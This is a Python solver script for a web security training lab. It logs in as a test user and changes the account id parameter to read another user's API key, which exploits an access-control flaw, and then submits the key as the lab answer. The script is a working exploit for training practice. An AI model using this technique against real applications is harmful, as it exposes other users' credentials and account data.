import requests
import sys
import re
from bs4 import BeautifulSoup



def extract_csrf_token(response):
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    return csrf_token


def login(url, session):
    response = session.get(f"{url}/login", timeout=10)
    csrf_token = extract_csrf_token(response)
    login_response = session.post(f"{url}/login", data={"csrf": csrf_token, "username": "wiener", "password": "peter"}, timeout=10)
    return "Your username is: wiener" in login_response.text


def get_api_key(url, session):
    response = session.get(f"{url}/my-account?id=carlos", timeout=10)
    carlos_api_key = re.search("Your API Key is: ([a-zA-Z0-9]+)", response.text).group(1)
    return carlos_api_key


def submit_solution(url, session, api_key):
    response = session.post(f"{url}/submitSolution", data={"answer": api_key}, timeout=10)
    return '{"correct":true}' in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Logging in as wiener...")
        if not login(url, session):
            print("(-) Something went wrong. Please check your URL and try again.")
            sys.exit(1)

        print("(+) Getting Carlos's API key....")
        api_key = get_api_key(url, session)
        if api_key:
            print(f"(+) Successfully retrieved Carlos's API key! His API Key is: {api_key}")
        else:
            print("(-) Something went wrong. Please try again.")
            sys.exit(1)

        print("(+) Submitting solution...")
        if submit_solution(url, session, api_key):
            print("(+) Lab successfully solved!")
        else:
            print("(-) Something went wrong. Please try again.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()